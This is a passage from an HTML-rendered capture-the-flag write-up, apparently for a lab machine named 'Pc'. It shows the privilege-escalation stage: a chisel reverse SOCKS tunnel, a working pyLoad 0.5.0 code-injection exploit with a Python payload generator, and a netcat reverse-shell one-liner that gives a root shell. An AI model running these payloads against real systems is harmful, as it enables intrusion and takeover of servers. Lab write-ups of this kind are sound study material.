tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:9666<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">34098</span><span class="w">      </span>-
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::22<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">32647</span><span class="w">      </span>-
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::50051<span class="w">                </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">33952</span><span class="w">      </span>-
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">101</span><span class="w">        </span><span class="m">31967</span><span class="w">      </span>-
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:68<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">0</span><span class="w">          </span><span class="m">27627</span><span class="w">      </span>-
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:~$<span class="w"> </span>curl<span class="w"> </span>-i<span class="w"> </span>http://127.0.0.1:8000
HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>FOUND
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length:<span class="w"> </span><span class="m">275</span>
Location:<span class="w"> </span>/login?next<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A8000%2F
Vary:<span class="w"> </span>Accept-Encoding
Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">21</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">21</span>:16:49<span class="w"> </span>GMT
Server:<span class="w"> </span>Cheroot/8.6.0

&lt;!doctype<span class="w"> </span>html&gt;
&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span>en&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>redirected<span class="w"> </span>automatically<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>URL:<span class="w"> </span>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&quot;</span>&gt;/login?next<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A8000%2F&lt;/a&gt;.<span class="w"> </span>If<span class="w"> </span>not,<span class="w"> </span>click<span class="w"> </span>the<span class="w"> </span>link.
</pre></div>
</div>
<p>Setting up a socks5 chisel server</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>local#<span class="w"> </span>./chisel-arm<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">4242</span><span class="w"> </span>--socks5<span class="w"> </span>--reverse
remote#<span class="w"> </span>./chisel-amd<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.14.207:4242<span class="w"> </span>R:1080:socks
</pre></div>
</div>
<p>Connecting to the app through the proxy<br />
<img alt="pyload.png" src="../../../../_images/pyload.png" /></p>
<p>Things I see flying through in pspy64</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">20</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">1038</span>   <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pyload</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">20</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">1032</span>   <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">20</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">103</span>    <span class="o">|</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">01</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">175023</span> <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">CRON</span> <span class="o">-</span><span class="n">f</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">01</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">175024</span> <span class="o">|</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">01</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">175025</span> <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">cp</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">sqlite</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">bak</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">sqlite</span><span class="o">.</span><span class="n">db</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:/usr/local/bin$<span class="w"> </span>pyload<span class="w"> </span>-h
usage:<span class="w"> </span>pyload<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>-d<span class="o">]</span><span class="w"> </span><span class="o">[</span>-r<span class="o">]</span><span class="w"> </span><span class="o">[</span>--storagedir<span class="w"> </span>STORAGEDIR<span class="o">]</span><span class="w"> </span><span class="o">[</span>--userdir<span class="w"> </span>USERDIR<span class="o">]</span><span class="w"> </span><span class="o">[</span>--tempdir<span class="w"> </span>TEMPDIR<span class="o">]</span>
<span class="w">              </span><span class="o">[</span>--pidfile<span class="w"> </span>PIDFILE<span class="o">]</span><span class="w"> </span><span class="o">[</span>--dry-run<span class="o">]</span><span class="w"> </span><span class="o">[</span>--daemon<span class="o">]</span><span class="w"> </span><span class="o">[</span>--quit<span class="o">]</span><span class="w"> </span><span class="o">[</span>--status<span class="o">]</span><span class="w"> </span><span class="o">[</span>--version<span class="o">]</span>

<span class="w">       </span>____________
<span class="w">   </span>___/<span class="w">       </span><span class="p">|</span><span class="w">    </span><span class="se">\_</span>____________<span class="w"> </span>_<span class="w"> </span>_______________<span class="w"> </span>_<span class="w"> </span>___
<span class="w">  </span>/<span class="w">   </span><span class="p">|</span><span class="w">    </span>___/<span class="w">    </span><span class="p">|</span><span class="w">    </span>_<span class="w"> </span>__<span class="w"> </span>_<span class="w">  </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">   </span>___<span class="w">  </span>__<span class="w"> </span>_<span class="w"> </span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">   </span><span class="se">\</span>
<span class="w"> </span>/<span class="w">    </span><span class="se">\_</span>__/<span class="w">  </span>______/<span class="w">   </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ \ || | |__/ _ \/ _` / _` |    \</span>
<span class="s1"> \        |   ◯|       | .__/\_, |____\___/\__,_\__,_|    /</span>
<span class="s1">  \_______\    /_______|_|___|__/________________________/</span>
<span class="s1">           \  /</span>
<span class="s1">            \/</span>

<span class="s1">The free and open-source Download Manager written in pure Python</span>

<span class="s1">optional arguments:</span>
<span class="s1">  -h, --help            show this help message and exit</span>
<span class="s1">  -d, --debug           enable debug mode</span>
<span class="s1">  -r, --reset           reset default username/password</span>
<span class="s1">  --storagedir STORAGEDIR</span>
<span class="s1">                        use this location to save downloads</span>
<span class="s1">  --userdir USERDIR     use this location to store user data files</span>
<span class="s1">  --tempdir TEMPDIR     use this location to store temporary files</span>
<span class="s1">  --pidfile PIDFILE     set the full path to the pidfile</span>
<span class="s1">  --dry-run             test start-up and exit</span>
<span class="s1">  --daemon              run as daemon</span>
<span class="s1">  --quit                quit running pyLoad instance</span>
<span class="s1">  --status              display pid if running or 0</span>
<span class="s1">  --version             show program&#39;</span>s<span class="w"> </span>version<span class="w"> </span>number<span class="w"> </span>and<span class="w"> </span><span class="nb">exit</span>
sau@pc:/usr/local/bin$<span class="w"> </span>pyload<span class="w"> </span>--version
pyLoad<span class="w"> </span><span class="m">0</span>.5.0
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d">https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d</a><br />
<a class="reference external" href="https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/">https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>proxychains -q curl -i -s -k -X $&#39;POST&#39; \
    -H $&#39;Host: 127.0.0.1:8000&#39; -H $&#39;Content-Type: application/x-www-form-urlencoded&#39; -H $&#39;Content-Length: 184&#39; \
    --data-binary $&#39;package=xxx&amp;crypted=AAAA&amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&amp;passwords=aaaa&#39; \
    $&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 21 May 2023 22:07:18 GMT
Server: Cheroot/8.6.0

Could not decrypt key
</pre></div>
</div>
<p>A straight copy paste of the PoC just works</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:/tmp$<span class="w"> </span>date<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/tmp/pwnd
Sun<span class="w"> </span>May<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span>:10:04<span class="w"> </span>UTC<span class="w"> </span><span class="m">2023</span>
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">0</span><span class="w"> </span>May<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span>:10<span class="w"> </span>/tmp/pwnd
</pre></div>
</div>
<p>The original payload</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">79</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">6</span><span class="n">d</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">72</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">79</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">6</span><span class="n">d</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">6</span><span class="n">d</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">77</span><span class="o">%</span><span class="mi">6</span><span class="n">e</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">29</span>
</pre></div>
</div>
<p>==</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">pyimport</span> <span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;touch /tmp/pwnd&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>Making a payload generator</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;pyimport os;os.system(&quot;</span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s1">&quot;)&#39;</span>
<span class="c1">#print(payload)</span>

<span class="n">enc_payload</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
    <span class="n">enc_payload</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)))</span>

<span class="n">enc_payload</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">enc_payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;0x&quot;</span><span class="p">,</span><span class="s2">&quot;%&quot;</span><span class="p">)</span>
<span class="c1">#print(enc_payload)</span>

<span class="n">enc_payload</span><span class="o">=</span><span class="s1">&#39;package=xxx&amp;crypted=AAAA&amp;jk=&#39;</span><span class="o">+</span><span class="n">enc_payload</span><span class="o">+</span><span class="s1">&#39;;f=function</span><span class="si">%20f</span><span class="s1">2()</span><span class="si">{}</span><span class="s1">;&amp;passwords=aaaa&#39;</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1:8000&quot;</span><span class="p">,</span> <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">},</span>
    <span class="n">data</span><span class="o">=</span><span class="n">enc_payload</span><span class="p">,</span>
    <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="s2">&quot;socks5://127.0.0.1:1080&quot;</span><span class="p">}</span>
<span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>payloader.py<span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.3 4000 &gt;/tmp/f&#39;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4000</span>
<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">4000</span> <span class="o">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.3</span><span class="p">]</span> <span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.11.214</span><span class="p">]</span> <span class="mi">46632</span>
<span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
<span class="c1"># id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
<span class="c1">#</span>
</pre></div>
</div>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../photobomb/photobomb.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Photobomb</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../monitorstwo/monitorstwo.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Monitors two</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Pc</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#manual-blind-boolean-based-injection">Manual blind Boolean based injection</a></li>
<li><a class="reference internal" href="#privesc">Privesc</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>